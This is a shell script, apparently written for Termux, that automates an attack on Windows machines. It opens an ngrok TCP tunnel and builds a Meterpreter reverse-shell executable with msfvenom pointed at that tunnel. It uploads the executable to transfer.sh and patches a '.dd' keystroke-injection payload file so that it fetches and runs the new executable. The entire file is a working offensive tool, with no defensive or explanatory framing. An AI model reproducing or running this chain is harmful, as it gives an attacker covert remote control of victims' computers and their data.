#!/bin/sh
echo "Checking if any ngrok server is already running and killing it..."
~/msf/script/check_ngrok.sh
pkill ngrok
ngrok tcp 5656 > /dev/null &
echo "NGROK RANDOM SERVER TCP IS STARTING..."
sleep 4.5
TEMPFILE=/data/data/com.termux/files/home/msf/temp/.temp_ip_ngrok-tcp.txt
echo "$(curl -s localhost:4040/api/tunnels | grep -Eo "(tcp)://[a-zA-Z0-9./?=_%:-]*" | sed "s#tcp://##g")" > $TEMPFILE
echo "The file\033[1;32m .temp_ip_ngrok-tcp.txt \033[0m has been created to store the IP & PORT address of your ngrok server"
FILE=reverse$RANDOM-$(cat $TEMPFILE |sed "s#:#-port#g").exe
IP=$(cat $TEMPFILE | sed 's/\:.*//')
PORT=$(cat $TEMPFILE |  cut -d ':' -f2)
echo "\033[1;32m \nCreating the payload...\033[0m"
echo "LHOST PAYLOAD: \033[1;34m$IP\033[0m \nLPORT PAYLOAD: \033[1;34m$PORT\033[0m"
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$IP LPORT=$PORT --smallest -f exe > ~/msf/temp/$FILE
echo "\n::::Name of the payload:"
echo "\033[1;32m $FILE  \033[0m"
echo "::::Copying the payload in utiles/msf folder... :\n"
cp ~/msf/temp/$FILE /storage/emulated/0/utiles/msf/
ls /storage/emulated/0/utiles/msf/$FILE
echo "\033[1;34m\n:::: Creating the file link-****.txt in msf folder to store \n::::the direct https link to the payload \033[0m"
LINKFILE=/data/data/com.termux/files/home/msf/temp/link-$FILE.txt
echo "\033[1;42m:::: Uploading the file into transfer.sh ... \033[0m"
curl --upload-file ~/msf/temp/$FILE https://transfer.sh/reverse.exe > $LINKFILE
echo "\033[1;42m::::DONE\033[0m"
echo "\n::::The payload has been upload on transfer.sh here:\n \033[1;45m$(cat $LINKFILE)\033[0m"
echo "::::The .dd file is creating .."
rm /storage/emulated/0/utiles/payload.dd
echo "$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | sed "s#$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)#$(cat $LINKFILE)#g")" > /storage/emulated/0/utiles/payload.dd
echo "\nold link: \033[1;32m $(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "new link:\033[1;32m $(cat /storage/emulated/0/utiles/payload.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)\033[0m"
echo "$(cat /data/data/com.termux/files/home/msf/dd/payload_sample.dd | grep -Eo 'http.*.exe' | cut -d' ' -f1)" > ~/msf/temp/old_link.txt
echo "$(cat $LINKFILE)" > ~/msf/temp/new_link.txt
OLDLINK=$(cat ~/msf/temp/old_link.txt)
NEWLINK=$(cat ~/msf/temp/new_link.txt)
if [ "$OLDLINK" = "$NEWLINK" ]
then
	echo "\033[1;31m Failed to change the link in the .dd file \033[0m"
else
	echo "\033[1;32m\n:::: SUCCESS, PAYLOAD.DD CREATED AND STORED here :"
	ls /storage/emulated/0/utiles/payload.dd
fi
